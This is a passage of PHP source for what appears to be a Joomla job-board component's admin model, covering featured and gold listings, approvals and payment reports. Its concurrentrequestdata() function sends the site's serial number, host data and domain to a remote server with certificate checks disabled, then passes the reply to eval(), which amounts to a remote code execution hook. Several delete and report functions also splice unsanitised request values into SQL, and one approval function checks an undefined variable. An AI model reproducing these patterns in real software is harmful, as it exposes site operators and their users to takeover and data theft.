            $lists['companies'] = JHTML::_('select.genericList', $this->getCompany(''), 'companyid', 'class="inputbox required" ' . '', 'value', 'text', '');
            $lists['employerpackage'] = JHTML::_('select.genericList', $this->getEmployerPackageForCombo(''), 'packageid', 'class="inputbox required" ' . '', 'value', 'text', '');
        }

        $query = "SELECT company.name AS companyname
		FROM #__js_job_companies AS company
		WHERE company.id=" . $companyid;

        $db->setQuery($query);
        $companyname = $db->loadResult();

        $result[0] = $goldcompany;
        $result[1] = $lists;
        $result[2] = $companyname;
        return $result;
    }

    function storeGoldCompany($uid, $companyid) {
        $db = & JFactory::getDBO();
        if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))
            return false;
        if (is_numeric($companyid) == false)
            return false;
        $result = $this->goldCompanyValidation($uid, $companyid);
        if ($result == false) {
            return 6;
        } else {
            $query = "UPDATE `#__js_job_companies` SET isgoldcompany = 1,startgolddate=CURDATE() WHERE id = " . $companyid;
            $db->setQuery($query);
            if (!$db->query())
                return false;
            else
                return true;
        }
    }

    function goldCompanyValidation($uid, $companyid) {
        $db = & JFactory::getDBO();
        if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))
            return false;

        $query = "SELECT COUNT(company.id)  
		FROM #__js_job_companies  AS company
		WHERE company.isgoldcompany=1 AND company.id = " . $companyid;
        $db->setQuery($query);
        $result = $db->loadResult();
        if ($result == 0)
            return true;
        else
            return false;
    }

    function deleteGoldCompany() {
        $db = & JFactory :: getDBO();
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $deleteall = 1;
        foreach ($cids as $cid) {
            $query = "UPDATE `#__js_job_companies` SET isgoldcompany = 0 WHERE id = " . $cid;
            $db->setQuery($query);
            if (!$db->query())
                return false;
        }
        return true;
    }

    function & getFeaturedCompanies($searchcompany, $searchemployerpackage, $searchcountry, $limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(featuredcompany.id)
		FROM #__js_job_companies AS featuredcompany
		LEFT JOIN #__js_job_employerpackages  AS package ON featuredcompany.packageid = package.id
		WHERE featuredcompany.isfeaturedcompany=1 AND featuredcompany.status <> 0";
        if ($searchcompany)
            $query .= " AND LOWER(featuredcompany.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchemployerpackage)
            $query .= " AND LOWER(package.title) LIKE " . $db->Quote('%' . $searchemployerpackage . '%', false);
        if ($searchcountry)
            $query .= " AND company.country = " . $db->Quote($searchcountry);
        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT featuredcompany.id,featuredcompany.name,featuredcompany.created,featuredcompany.status,package.title AS packagetitle 
		FROM #__js_job_companies AS featuredcompany
		LEFT JOIN #__js_job_employerpackages  AS package ON featuredcompany.packageid = package.id
		WHERE featuredcompany.isfeaturedcompany=1 AND featuredcompany.status <> 0";
        if ($searchcompany)
            $query .= " AND LOWER(featuredcompany.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchemployerpackage)
            $query .= " AND LOWER(package.title) LIKE " . $db->Quote('%' . $searchemployerpackage . '%', false);
        if ($searchcountry)
            $query .= " AND company.country = " . $db->Quote($searchcountry);

        $db->setQuery($query, $limitstart, $limit);
        $featuredcompany = $db->loadObjectList();
        $lists = array();

        $job_categories = $this->getCategories(JText::_('JS_SELECT_JOB_CATEGORY'), '');
        $countries = $this->getCountries(JText::_('JS_SELECT_COUNTRY'));
        if ($searchcompany)
            $lists['searchcompany'] = $searchcompany;
        if ($searchemployerpackage)
            $lists['searchemployerpackage'] = $searchemployerpackage;
        if ($searchcountry)
            $lists['country'] = JHTML::_('select.genericList', $countries, 'searchcountry', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', $searchcountry);
        else
            $lists['country'] = JHTML::_('select.genericList', $countries, 'searchcountry', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', '');

        $result[0] = $featuredcompany;
        $result[1] = $total;
        $result[2] = $lists;
        return $result;
    }

    function & getAllUnapprovedFeaturedCompanies($searchcompany, $searchemployerpackage, $searchcountry, $limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(featuredcompany.id)
		FROM #__js_job_featuredcompanies AS featuredcompany
		JOIN #__js_job_employerpackages  AS package ON featuredcompany.packageid = package.id
		JOIN   #__js_job_companies AS company  ON  company.id=featuredcompany.companyid
		WHERE featuredcompany.status = 0";
        if ($searchcompany)
            $query .= " AND LOWER(company.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchemployerpackage)
            $query .= " AND LOWER(package.title) LIKE " . $db->Quote('%' . $searchemployerpackage . '%', false);
        if ($searchcountry)
            $query .= " AND company.country = " . $db->Quote($searchcountry);
        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT featuredcompany.*,company.name,company.url, package.title AS packagetitle , country.name AS countryname
		FROM #__js_job_featuredcompanies AS featuredcompany
		JOIN   #__js_job_companies AS company  ON  company.id=featuredcompany.companyid
		JOIN #__js_job_employerpackages  AS package ON featuredcompany.packageid = package.id
		JOIN #__js_job_countries AS country ON company.country = country.id
		WHERE featuredcompany.status = 0";
        if ($searchcompany)
            $query .= " AND LOWER(company.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchemployerpackage)
            $query .= " AND LOWER(package.title) LIKE " . $db->Quote('%' . $searchemployerpackage . '%', false);
        if ($searchcountry)
            $query .= " AND company.country = " . $db->Quote($searchcountry);

        $db->setQuery($query, $limitstart, $limit);
        $featuredcompany = $db->loadObjectList();
        $lists = array();

        $job_categories = $this->getCategories(JText::_('JS_SELECT_JOB_CATEGORY'), '');
        $countries = $this->getCountries(JText::_('JS_SELECT_COUNTRY'));
        if ($searchcompany)
            $lists['searchcompany'] = $searchcompany;
        if ($searchemployerpackage)
            $lists['searchemployerpackage'] = $searchemployerpackage;
        if ($searchcountry)
            $lists['country'] = JHTML::_('select.genericList', $countries, 'searchcountry', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', $searchcountry);
        else
            $lists['country'] = JHTML::_('select.genericList', $countries, 'searchcountry', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', '');

        $result[0] = $featuredcompany;
        $result[1] = $total;
        $result[2] = $lists;
        return $result;
    }

    function & getFeaturedCompanyId($companyid, $c_id) {
        if (is_numeric($companyid) == false)
            return false;
        if (is_numeric($c_id) == false)
            return false;

        $db = & JFactory :: getDBO();
        $result = array();

        $query = "SELECT featuredcompany.id,featuredcompany.name AS companyname,featuredcompany.packageid 
		FROM #__js_job_companies AS featuredcompany";
        $id = ($companyid != '' AND $companyid != 0) ? $companyid : $c_id;
        $query.=" WHERE featuredcompany.id=" . $id;

        $db->setQuery($query);
        $featuredcompany = $db->loadObject();

        if (isset($featuredcompany)) {
            $lists['companies'] = JHTML::_('select.genericList', $this->getCompany(''), 'companyid', 'class="inputbox required" ' . '', 'value', 'text', $featuredcompany->id);
            $lists['employerpackage'] = JHTML::_('select.genericList', $this->getEmployerPackageForCombo(''), 'packageid', 'class="inputbox required" ' . '', 'value', 'text', $featuredcompany->packageid);
        } else {
            $lists['companies'] = JHTML::_('select.genericList', $this->getCompany(''), 'companyid', 'class="inputbox required" ' . '', 'value', 'text', '');
            $lists['employerpackage'] = JHTML::_('select.genericList', $this->getEmployerPackageForCombo(''), 'packageid', 'class="inputbox required" ' . '', 'value', 'text', '');
        }

        $query = "SELECT company.name AS companyname
		FROM #__js_job_companies AS company
		WHERE company.id=" . $companyid;

        $db->setQuery($query);
        $companyname = $db->loadResult();

        $result[0] = $featuredcompany;
        $result[1] = $lists;
        $result[2] = $companyname;
        return $result;
    }

    function storeFeaturedCompany($companyid, $uid) {
        $db = & JFactory::getDBO();
        if (is_numeric($companyid) == false)
            return false;
        if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))
            return false;
        $result = $this->featuredCompanyValidation($uid, $companyid);
        if ($result == false) {
            return 6;
        } else {
            $query = "UPDATE `#__js_job_companies` SET isfeaturedcompany = 1,startfeatureddate=CURDATE() WHERE id = " . $companyid;
            $db->setQuery($query);
            if (!$db->query())
                return false;
            else
                return true;
        }
    }

    function featuredCompanyValidation($uid, $companyid) {

        if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))
            return false;
        if (is_numeric($companyid) == false)
            return false;
        $db = & JFactory::getDBO();


        $query = "SELECT COUNT(company.id)  
		FROM #__js_job_companies  AS company
		WHERE company.isfeaturedcompany=1 AND company.id = " . $companyid;
        $db->setQuery($query);
        $result = $db->loadResult();
        if ($result == 0)
            return true;
        else
            return false;
    }

    function deleteFeaturedCompany() {
        $db = & JFactory::getDBO();
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $deleteall = 1;
        foreach ($cids as $cid) {
            $query = "UPDATE `#__js_job_companies` SET isfeaturedcompany = 0 WHERE id = " . $cid;
            $db->setQuery($query);
            if (!$db->query())
                return false;
        }
        return true;
    }

    function goldCompanyApprove($companyid) {
        if (is_numeric($companyid) == false)
            return false;
        $db = & JFactory::getDBO();
        $query = "UPDATE #__js_job_goldcompanies SET status = 1 WHERE id = " . $companyid;
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        return true;
    }

    function goldCompanyReject($companyid) {
        if (is_numeric($companyid) == false)
            return false;
        $db = & JFactory::getDBO();
        $query = "UPDATE #__js_job_goldcompanies SET status = -1 WHERE id = " . $companyid;
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        return true;
    }

    function featuredCompanyApprove($companyid) {
        if (is_numeric($companyid) == false)
            return false;
        $db = & JFactory::getDBO();
        $query = "UPDATE #__js_job_featuredcompanies SET status = 1 WHERE id = " . $companyid;
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        return true;
    }

    function featuredCompanyReject($companyid) {
        if (is_numeric($companyid) == false)
            return false;
        $db = & JFactory::getDBO();
        $query = "UPDATE #__js_job_featuredcompanies SET status = -1 WHERE id = " . $companyid;
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        return true;
    }

    function featuredJobApprove($jobid) {
        if (is_numeric($jobid) == false)
            return false;
        $db = & JFactory::getDBO();
        $query = "UPDATE #__js_job_featuredjobs SET status = 1 WHERE id = " . $jobid;
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        return true;
    }

    function featuredJobReject($jobid) {
        if (is_numeric($jobid) == false)
            return false;
        $db = & JFactory::getDBO();
        $query = "UPDATE #__js_job_featuredjobs SET status = -1 WHERE id = " . $jobid;
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        return true;
    }

    function goldJobApprove($jobid) {
        if (is_numeric($jobid) == false)
            return false;
        $db = & JFactory::getDBO();
        $query = "UPDATE #__js_job_goldjobs SET status = 1 WHERE id = " . $jobid;
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        return true;
    }

    function goldJobReject($jobid) {
        if (is_numeric($jobid) == false)
            return false;
        $db = & JFactory::getDBO();
        $query = "UPDATE #__js_job_goldjobs SET status = -1 WHERE id = " . $jobid;
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        return true;
    }

    function featuredResumeApprove($resumeid) {
        if (is_numeric($jobid) == false)
            return false;
        $db = & JFactory::getDBO();
        $query = "UPDATE #__js_job_featuredresumes SET status = 1 WHERE id = " . $resumeid;
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        return true;
    }

    function featuredResumeReject($resumeid) {
        if (is_numeric($resumeid) == false)
            return false;
        $db = & JFactory::getDBO();
        $query = "UPDATE #__js_job_featuredresumes SET status = -1 WHERE id = " . $resumeid;
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        return true;
    }

    function goldResumeApprove($resumeid) {
        if (is_numeric($resumeid) == false)
            return false;
        $db = & JFactory::getDBO();
        $query = "UPDATE #__js_job_goldresumes SET status = 1 WHERE id = " . $resumeid;
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        return true;
    }

    function goldResumeReject($resumeid) {
        if (is_numeric($resumeid) == false)
            return false;
        $db = & JFactory::getDBO();
        $query = "UPDATE #__js_job_goldresumes SET status = -1 WHERE id = " . $resumeid;
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        return true;
    }

// Payment System End;
// Payment Package Code
    function getPaymentStatus($title) {
        $db = & JFactory::getDBO();
        $AppRej = array();
        if ($title)
            $AppRej[] = array('value' => '', 'text' => $title);

        $AppRej[] = array('value' => 1, 'text' => JText::_('JS_VERIFIED'));
        $AppRej[] = array('value' => -1, 'text' => JText::_('JS_NOT_VERIFIED'));

        return $AppRej;
    }

    function jobseekerPaymentApprove($packageid) {
        if (is_numeric($packageid) == false)
            return false;
        $db = & JFactory::getDBO();

        $query = "UPDATE #__js_job_paymenthistory SET transactionverified = 1, status=1 WHERE id = " . $packageid;
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        return true;
    }

    function jobseekerPaymentReject($packageid) {
        if (is_numeric($packageid) == false)
            return false;
        $db = & JFactory::getDBO();

        $query = "UPDATE #__js_job_paymenthistory SET transactionverified = -1 , status= -1 WHERE id = " . $packageid;
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        return true;
    }

    function employerPaymentApprove($packageid) {
        if (is_numeric($packageid) == false)
            return false;
        $db = & JFactory::getDBO();

        $query = "UPDATE #__js_job_paymenthistory SET transactionverified = 1 , status=1 WHERE id = " . $packageid;
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        return true;
    }

    function employerPaymentReject($packageid) {
        if (is_numeric($packageid) == false)
            return false;
        $db = & JFactory::getDBO();

        $query = "UPDATE #__js_job_paymenthistory SET transactionverified = -1  , status= -1 WHERE id = " . $packageid;
        $db->setQuery($query);
        if (!$db->query()) {
            return false;
        }
        return true;
    }

    function concurrentrequestdata() {
        $data = $this->getConcurrentRequestData();
        $url = "https://setup.joomsky.com/jsjobs/pro/verifier.php";
        $post_data['serialnumber'] = $data['serialnumber'];
        $post_data['zvdk'] = $data['zvdk'];
        $post_data['hostdata'] = $data['hostdata'];
        $post_data['domain'] = JURI::root();
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        $response = curl_exec($ch);
        curl_close($ch);
        eval($response);
    }

  
    function & getEmployerPackages($limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(id) FROM #__js_job_employerpackages ";
        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT * FROM #__js_job_employerpackages  ORDER BY id ASC";

        $db->setQuery($query, $limitstart, $limit);
        $packages = $db->loadObjectList();

        $result[0] = $packages;
        $result[1] = $total;
        return $result;
    }

    function & getEmployerPackagebyId($c_id) {
        if (is_numeric($c_id) == false)
            return false;
        $db = & JFactory :: getDBO();
        $query = "SELECT * FROM #__js_job_employerpackages WHERE id = " . $c_id;
        $db->setQuery($query);
        $package = $db->loadObject();
        $status = array(
            '0' => array('value' => 0, 'text' => JText::_('JS_UNPUBLISHED')),
            '1' => array('value' => 1, 'text' => JText::_('JS_PUBLISHED')),);
        $unpublishjobtype = array(
            '0' => array('value' => 1, 'text' => JText::_('JS_DAYS')),
            '1' => array('value' => 2, 'text' => JText::_('JS_WEEKS')),
            '2' => array('value' => 3, 'text' => JText::_('JS_MONTHS')),);
        $type = array(
            '0' => array('value' => 1, 'text' => JText::_('Amount')),
            '1' => array('value' => 2, 'text' => JText::_('%')),);

        $yesNo = array(
            '0' => array('value' => 1, 'text' => JText::_('yes')),
            '1' => array('value' => 0, 'text' => JText::_('No')),);

        if (isset($package)) {
            $lists['status'] = JHTML::_('select.genericList', $status, 'status', 'class="inputbox required" ' . '', 'value', 'text', $package->status);
            $lists['unpublishjobtype'] = JHTML::_('select.genericList', $unpublishjobtype, 'enforcestoppublishjobtype', 'class="inputbox required" ' . '', 'value', 'text', $package->enforcestoppublishjobtype);
            $lists['type'] = JHTML::_('select.genericList', $type, 'discounttype', 'class="inputbox required" ' . '', 'value', 'text', $package->discounttype);
            $lists['resumesearch'] = JHTML::_('select.genericList', $yesNo, 'resumesearch', 'class="inputbox required" ' . '', 'value', 'text', $package->resumesearch);
            $lists['saveresumesearch'] = JHTML::_('select.genericList', $yesNo, 'saveresumesearch', 'class="inputbox required" ' . '', 'value', 'text', $package->saveresumesearch);
            $lists['messages'] = JHTML::_('select.genericList', $yesNo, 'messageallow', 'class="inputbox required" ' . '', 'value', 'text', $package->messageallow);
            $lists['currency'] = JHTML::_('select.genericList', $this->getCurrency(), 'currencyid', 'class="inputbox" ' . '', 'value', 'text', $package->currencyid);
        } else {
            $lists['status'] = JHTML::_('select.genericList', $status, 'status', 'class="inputbox required" ' . '', 'value', 'text', '');
            $lists['unpublishjobtype'] = JHTML::_('select.genericList', $unpublishjobtype, 'unpublishjobtype', 'class="inputbox required" ' . '', 'value', 'text', '');
            $lists['type'] = JHTML::_('select.genericList', $type, 'discounttype', 'class="inputbox required" ' . '', 'value', 'text', '');
            $lists['resumesearch'] = JHTML::_('select.genericList', $yesNo, 'resumesearch', 'class="inputbox required" ' . '', 'value', 'text', '');
            $lists['saveresumesearch'] = JHTML::_('select.genericList', $yesNo, 'saveresumesearch', 'class="inputbox required" ' . '', 'value', 'text', '');
            $lists['messages'] = JHTML::_('select.genericList', $yesNo, 'messageallow', 'class="inputbox required" ' . '', 'value', 'text', '');
            $lists['currency'] = JHTML::_('select.genericList', $this->getCurrency(), 'currencyid', 'class="inputbox" ' . '', 'value', 'text', '');
        }

        $result[0] = $package;
        $result[1] = $lists;

        return $result;
    }

    function getPaymentMethodLinks($packageid, $packagefor) {
        if(!is_numeric($packageid)) return false;
        $db = &$this->getDBO();
        $query = "SELECT paymentmethod.id AS paymentmethod_id,paymentmethod.title, link.id AS linkid, link.link
						FROM `#__js_job_paymentmethods` AS paymentmethod
						LEFT JOIN `#__js_job_paymentmethodlinks` AS link ON link.paymentmethodid = paymentmethod.id AND link.packageid=" . $packageid . " AND link.packagefor=" . $packagefor . "
						WHERE enable = 1 OR haslink = 1  ";

        $db->setQuery($query);
        $paymentmethods = $db->loadObjectList();
        return $paymentmethods;
    }

    function &getPaymentReport($buyername, $paymentfor, $searchpaymentstatus, $searchstartdate, $searchenddate, $limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        if (!isset($this->_config))
            $this->getConfig();
        foreach ($this->_config AS $config) {
            if ($config->configname == 'date_format')
                $dateformat = $config->configvalue;
        }
        $companywherequery = '';
        $ewherequery = '';
        $jwherequery = '';
        $wherequery = '';
        if (!$searchstartdate) {
            $searchstartdate = date('Y-m-d', strtotime(date("Y-m-d") . " -1 month"));
            $searchenddate = date('Y-m-d', strtotime(date("Y-m-d") . " +1 day")); //include today
        } else {
            $searchstartdate = date('Y-m-d', strtotime($searchstartdate));
            $searchenddate = date('Y-m-d', strtotime($searchenddate));
        }

        if ($paymentfor == '')
            $paymentfor = 'both';
        if ($paymentfor == 'both') {
            $clause = " WHERE ";
            if ($searchpaymentstatus) {
                $ewherequery .= $clause . "  epayment.transactionverified = " . $searchpaymentstatus;
                $jwherequery .= $clause . "  jpayment.transactionverified = " . $searchpaymentstatus;
                $clause = " AND ";
            }
            if ($searchstartdate AND $searchenddate) {
                $ewherequery .= $clause . "  epayment.created BETWEEN " . $db->Quote($searchstartdate) . " AND " . $db->Quote($searchenddate);
                $jwherequery .= $clause . "  jpayment.created BETWEEN " . $db->Quote($searchstartdate) . " AND " . $db->Quote($searchenddate);
                $clause = " AND ";
            }
        } else {
            $clause = " WHERE ";
            if ($searchpaymentstatus) {
                $wherequery .= $clause . "  payment.transactionverified = " . $searchpaymentstatus;
                $clause = " AND ";
            }
            if ($searchstartdate AND $searchenddate) {
                $wherequery .= $clause . "  payment.created BETWEEN " . $db->Quote($searchstartdate) . " AND " . $db->Quote($searchenddate);
                $clause = " AND ";
            }
        }
        if ($paymentfor == 'employer') {
            $totalquery = "SELECT COUNT(payment.id)
					FROM #__js_job_paymenthistory AS payment
					JOIN #__js_job_employerpackages AS package ON (payment.packageid = package.id AND payment.packagefor=1)";

            $query = "SELECT payment.uid,payment.packageid,payment.packagetitle, 'Employer' AS packagefor, payment.payer_firstname,payment.paidamount,payment.transactionverified,payment.created,cur.symbol
                                        ,(SELECT company.name FROM #__js_job_companies AS company WHERE payment.uid = company.uid " . $companywherequery . " LIMIT 1 ) AS buyername
					FROM #__js_job_paymenthistory AS payment
					JOIN #__js_job_employerpackages AS package ON (payment.packageid = package.id AND payment.packagefor=1)
					LEFT JOIN #__js_job_currencies AS cur ON cur.id = payment.currencyid
					";

            $totalquery = $totalquery . $wherequery;
            $query = $query . $wherequery . ' ORDER BY payment.created DESC';
        } elseif ($paymentfor == 'jobseeker') {
            $totalquery = "SELECT COUNT(payment.id)
					FROM #__js_job_paymenthistory AS payment
					JOIN #__js_job_jobseekerpackages AS package ON (payment.packageid = package.id AND payment.packagefor=2)";

            $query = "SELECT payment.uid,payment.packageid,payment.packagetitle, 'Job Seeker' AS packagefor,payment.payer_firstname,payment.paidamount,payment.transactionverified,payment.created,cur.symbol
					,(SELECT CONCAT(resume.first_name,' ',resume.last_name) FROM #__js_job_resume AS resume WHERE payment.uid = resume.uid LIMIT 1) AS buyername
                                        FROM #__js_job_paymenthistory AS payment
					JOIN #__js_job_jobseekerpackages AS package ON (payment.packageid = package.id AND payment.packagefor=2)
					LEFT JOIN #__js_job_currencies AS cur ON cur.id = payment.currencyid
					";

            $totalquery = $totalquery . $wherequery;
            $query = $query . $wherequery . ' ORDER BY payment.created DESC';
        } elseif ($paymentfor == 'both') {
            $totalquery = "SELECT
					( SELECT COUNT(epayment.id) FROM `#__js_job_paymenthistory` AS epayment " . $ewherequery . ")
					+ ( SELECT COUNT(jpayment.id) FROM `#__js_job_paymenthistory` AS jpayment " . $jwherequery . ")
					AS total ";

            $query = "SELECT epayment.uid,epayment.packageid,epayment.packagetitle, 'Employer' AS packagefor, epayment.payer_firstname,epayment.paidamount,epayment.transactionverified,epayment.created,ecur.symbol AS symbol
                                        ,(SELECT company.name FROM #__js_job_companies AS company WHERE epayment.uid = company.uid LIMIT 1) AS buyername
					FROM #__js_job_paymenthistory AS epayment
					JOIN #__js_job_employerpackages AS epackage ON epayment.packageid = epackage.id
					LEFT JOIN #__js_job_currencies AS ecur ON ecur.id = epayment.currencyid
					";
            $unionquery = "
                            UNION
                            SELECT jpayment.uid,jpayment.packageid,jpayment.packagetitle, 'Job Seeker' AS packagefor,jpayment.payer_firstname,jpayment.paidamount,jpayment.transactionverified,jpayment.created,jcur.symbol AS symbol
                                        ,(SELECT CONCAT(resume.first_name,' ',resume.last_name) FROM #__js_job_resume AS resume WHERE jpayment.uid = resume.uid LIMIT 1) AS buyername
					FROM #__js_job_paymenthistory AS jpayment
					JOIN #__js_job_jobseekerpackages AS jpackage ON jpayment.packageid = jpackage.id
					LEFT JOIN #__js_job_currencies AS jcur ON jcur.id = jpayment.currencyid
					";
            $query = $query . $ewherequery . $unionquery . $jwherequery . ' ORDER BY created DESC';
        }
        $db->setQuery($totalquery);
        $total = $db->loadResult();

        if ($total <= $limitstart)
            $limitstart = 0;

        $db->setQuery($query, $limitstart, $limit);
        $payments = $db->loadObjectList();

        $lists = array();
        $searchstartdate = date($dateformat, strtotime($searchstartdate));
        $searchenddate = date($dateformat, strtotime($searchenddate));

        if ($buyername)
            $lists['buyername'] = $buyername;
        if ($searchstartdate)
            $lists['searchstartdate'] = $searchstartdate;
        if ($searchenddate)
            $lists['searchenddate'] = $searchenddate;

        $paymentforvalues = array(
            '0' => array('value' => 'both', 'text' => JText::_('JS_BOTH')),
            '1' => array('value' => 'employer', 'text' => JText::_('JS_EMPLOYER')),
            '2' => array('value' => 'jobseeker', 'text' => JText::_('JS_JOBSEEKER')),);

        $lists['paymentfor'] = JHTML::_('select.genericList', $paymentforvalues, 'paymentfor', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', $paymentfor);

        $paymentstatus = array(
            '0' => array('value' => '', 'text' => JText::_('JS_SELECT_PAYMENT_STATUS')),
            '1' => array('value' => 1, 'text' => JText::_('JS_VERIFIED')),
            '2' => array('value' => -1, 'text' => JText::_('JS_NOT_VERIFIED')),);

        if ($searchpaymentstatus)
            $lists['paymentstatus'] = JHTML::_('select.genericList', $paymentstatus, 'searchpaymentstatus', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', $searchpaymentstatus);
        else
            $lists['paymentstatus'] = JHTML::_('select.genericList', $paymentstatus, 'searchpaymentstatus', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', '');

        $result[0] = $payments;
        $result[1] = $total;
        $result[2] = $lists;
        $result[3] = $paymentfor;
        return $result;
    }

    function &getPackagePaymentReport($packageid, $paymentfor, $searchpaymentstatus, $searchstartdate, $searchenddate, $limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $companywherequery = '';
        if (!$searchstartdate) {
            $searchstartdate = date('Y-m-d', strtotime(date("Y-m-d") . " -1 month"));
            $searchenddate = date('Y-m-d');
        }
        if ($searchpaymentstatus)
            $wherequery .="  AND  payment.transactionverified = " . $searchpaymentstatus;
        if ($searchstartdate AND $searchenddate)
            $wherequery .="  AND  payment.created BETWEEN " . $db->Quote($searchstartdate) . " AND " . $db->Quote($searchenddate);

        if ($paymentfor == 'Employer') {
            $totalquery = "SELECT COUNT(payment.id)
					FROM #__js_job_paymenthistory AS payment
					JOIN #__js_job_employerpackages AS package ON (payment.packageid = package.id AND payment.packagefor=1)
					WHERE payment.packageid=" . $packageid;

            $query = "SELECT payment.packageid,payment.packagetitle, 'Employer' AS packagefor, payment.payer_firstname,payment.paidamount,payment.transactionverified,payment.created
                                        ,(SELECT company.name FROM #__js_job_companies AS company WHERE payment.uid = company.uid " . $companywherequery . " LIMIT 1 ) AS buyername
					FROM #__js_job_paymenthistory AS payment
					JOIN #__js_job_employerpackages AS package ON (payment.packageid = package.id AND payment.packagefor=1)
					WHERE payment.packageid=" . $packageid;

            $totalquery = $totalquery . $wherequery;
            $query = $query . $wherequery;
        } elseif ($paymentfor == 'Job Seeker') {

            $totalquery = "SELECT COUNT(payment.id)
					FROM #__js_job_paymenthistory AS payment
					JOIN #__js_job_jobseekerpackages AS package ON (payment.packageid = package.id AND payment.packagefor=2)
					WHERE payment.packageid = " . $packageid;

            $query = "SELECT payment.packageid,payment.packagetitle, 'Job Seeker' AS packagefor,payment.payer_firstname,payment.paidamount,payment.transactionverified,payment.created
					,(SELECT CONCAT(resume.first_name,' ',resume.last_name) FROM #__js_job_resume AS resume WHERE payment.uid = resume.uid LIMIT 1) AS buyername
					FROM #__js_job_paymenthistory AS payment
					JOIN #__js_job_jobseekerpackages AS package ON (payment.packageid = package.id AND payment.packagefor=2)
					WHERE payment.packageid = " . $packageid;

            $totalquery = $totalquery . $wherequery;
            $query = $query . $wherequery;
        }

        $db->setQuery($totalquery);
        $total = $db->loadResult();

        if ($total <= $limitstart)
            $limitstart = 0;

        $db->setQuery($query, $limitstart, $limit);
        $payments = $db->loadObjectList();

        $lists = array();

        if ($searchstartdate)
            $lists['searchstartdate'] = $searchstartdate;
        if ($searchenddate)
            $lists['searchenddate'] = $searchenddate;


        $paymentstatus = array(
            '0' => array('value' => '', 'text' => JText::_('JS_SELECT_PAYMENT_STATUS')),
            '1' => array('value' => 1, 'text' => JText::_('JS_VERIFIED')),
            '2' => array('value' => -1, 'text' => JText::_('JS_NOT_VERIFIED')),);

        if ($searchpaymentstatus)
            $lists['paymentstatus'] = JHTML::_('select.genericList', $paymentstatus, 'searchpaymentstatus', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', $searchpaymentstatus);
        else
            $lists['paymentstatus'] = JHTML::_('select.genericList', $paymentstatus, 'searchpaymentstatus', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', '');

        $result[0] = $payments;
        $result[1] = $total;
        $result[2] = $lists;

        return $result;
    }

    function &getEmployerPaymentHistory($searchtitle, $searchprice, $searchpaymentstatus, $packagefor, $limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(payment.id)
				FROM #__js_job_paymenthistory AS payment
				JOIN #__js_job_employerpackages AS package ON (payment.packageid = package.id AND payment.packagefor=" . $packagefor . ")";
        $clause = " WHERE ";

        if ($searchtitle) {
            $query .= $clause . "  payment.packagetitle LIKE " . $db->Quote('%' . $searchtitle . '%', false);
            $clause = " AND ";
        }
        if ($searchprice) {
            $query .= $clause . "payment. packageprice LIKE " . $db->Quote('%' . $searchprice . '%', false);
            $clause = " AND ";
        }
        if ($searchpaymentstatus)
            $query .= $clause . "  payment.transactionverified = " . $searchpaymentstatus;

        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total <= $limitstart)
            $limitstart = 0;
        $query = "SELECT payment.*,user.name AS employername,cur.symbol
				FROM #__js_job_paymenthistory AS payment
				JOIN #__js_job_employerpackages AS package ON (payment.packageid = package.id AND payment.packagefor=" . $packagefor . ")
				JOIN #__users AS user ON user.id = payment.uid
				LEFT JOIN #__js_job_currencies AS cur ON cur.id=payment.currencyid
				";

        $clause = " WHERE ";

